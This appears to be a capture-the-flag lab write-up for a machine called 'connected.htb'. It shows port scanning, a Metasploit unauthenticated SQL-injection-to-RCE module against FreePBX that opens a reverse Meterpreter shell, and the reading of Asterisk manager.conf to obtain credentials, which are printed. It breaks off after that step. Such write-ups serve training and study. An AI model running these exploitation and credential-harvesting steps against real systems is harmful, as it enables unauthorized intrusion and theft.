## Introduction

## Reconnaissance

#### Port Scanning
Initial port scan to discover open ports:
```bash
nmap 10.129.245.100 -n -Pn -p- -vvv -oN fastscan
```

```bash
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack
80/tcp  open  http    syn-ack
443/tcp open  https   syn-ack
```

Performing a deeper scan in web:
```bash
nmap 10.129.245.100 -n -Pn -p 80 -A -vvv -oN httpscan
```

Saw a redirection, so had to edit `/etc/hosts`to add that domain name:
```bash
http-title: Did not follow redirect to http://connected.htb/
```

### Initial Access
We surf the web and saw its running an instance of freepbx, and its telling us the version:
```bash
FreePBX 16.0.40.7 is licensed under the GPL
Copyright© 2007-2026
```

making an investigation, identified there is a CVE which allow us run a RCE via SQLinjection, and there is a exploit in Metasploit.
```bash
   3  exploit/unix/http/freepbx_unauth_sqli_to_rce         2025-08-28       excellent  Yes    FreePBX ajax.php unauthenticated SQLi to RCE

use 3
set RHOSTS 10.129.245.100
set LHOST 10.10.15.105
set VHOST connected.htb
run

[*] Started reverse TCP handler on 10.10.15.105:4444 
[+] Created cronjob with job name: 'mZDrxE'
[*] Waiting for cronjob to trigger...
[*] Sending stage (3090404 bytes) to 10.129.245.100
[*] Meterpreter session 1 opened (10.10.15.105:4444 -> 10.129.245.100:33006) at 2026-08-22 18:00:16 +0200
[*] Attempting to perform cleanup
[+] Cronjob removed, happy hacking!

(Meterpreter 1)(/home/asterisk) > 
```

### Finding relevant information 
Inside machine, we saw:
```bash
tcp    LISTEN     0      10                       127.0.0.1:5038                                         *:*
```

This means there is a Asterix manager interface, and can look for creds in the config file:
```bash

-bash-4.2$ cat /etc/asterisk/manager.conf
...
[general]
enabled = yes
port = 5038
bindaddr = 127.0.0.1
displayconnects=no ;only effects 1.6+

[wnPa2WbXJ/ED]
secret = fe1mYBs7D5P3
...
```
